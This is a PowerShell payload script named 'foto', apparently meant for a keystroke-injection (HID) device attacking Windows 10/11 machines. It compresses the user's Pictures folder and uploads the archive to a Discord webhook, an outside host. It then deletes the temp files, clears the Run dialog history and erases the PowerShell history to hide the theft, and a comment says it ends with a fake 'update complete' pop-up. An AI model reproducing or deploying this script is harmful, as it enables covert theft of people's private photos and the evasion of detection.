######################################################################################################################################################################
#                                             |                                                                   |             .'''''.        ..||..'''''''...      #
# -Title     :foto                            |                                                                   |            / ##### \       : ||            ''.   #
# -Author    :ItsIsaac                        |                                                                   |           | ## # ## |      :.||...''''''....  '. #
# -Version   :1.0                             |                                                                   |           | #  #  # |        ||             '''' &
# -Category  :System/ User Info Grab          |       .___  __           .___                                     |            \ ##### /     /| < _>                 #
# -Target    :W 10/11                         |       |   |/  |_  ______ |   | ___________  _____    ____         |             \ ### /     / |/ < _>                #
# -Mode:     :HID                             |       |   \   __\/  ___/ |   |/  ___/\__  \ \__  \ _/ ___\        |           ..''   ''... /  |  < _>                #
#                                             |       |   ||  |  \___ \  |   |\___ \  / __ \_/ __ \\  \___        |         .'            /   | /||                  #
#                                             |       |___||__| /____  > |___/____  >(____  (____  /\___  >       |         '                 |/ ||                  #
#                                             |                      \/           \/      \/     \/     \/        |         |   |     '..     |  ||                  # 
#                                             |                                                                   |         |   |     |  '...''  ||                  #
#_____________________________________________|___________________________________________________________________|         |  |       |         ||                  #
#                                                                                                                 |          \ |       |         ||                  # 
#                                                                                                                 |          |\|       |         ||                  #
#                                                                                                                 |          \|         |        ||                  #
#                                                                                                                 |           |         |        ||                  #
#  -github.com/ibeihoffer                                                                                         |           |         |        ||                  #
#  -linked.com/in/ibeihoffer                                                                                      |          |           |       ||                  #
#                                                                                                                 |        __|           |__     ||                  #
#                                                                                                                 |       /   '.........'   \    ||                  #
#                                                                                                                 |        ''''''     ''''''     ##                  #
######################################################################################################################################################################

#Find primary drive
$SystemDrive = (Get-WmiObject Win32_OperatingSystem).SystemDrive

#Create loot folder
$PicFolder = $SystemDrive + "\Users\$env:USERNAME\Pictures"

Set-Location $PicFolder

#Compress to zip
Compress-Archive -Path $PicFolder -DestinationPath $env:tmp\$env:USERNAME-foto.zip

#Exfil via webhook

######################################################################################################################################################################

#Discord Upload
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

#Webhook created in discord channel
$hookurl = "$dc"


$Body = @{
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

Upload-Discord -file "$env:tmp/$env:USERNAME-foto.zip"

######################################################################################################################################################################

#Clean up ps and tmp

#Clear temp folder
rm $env:tmp\$env:USERNAME* -r -Force -ErrorAction SilentlyContinue

#Clear run history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

#Clear powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

######################################################################################################################################################################

#pop up "update complete" then exits

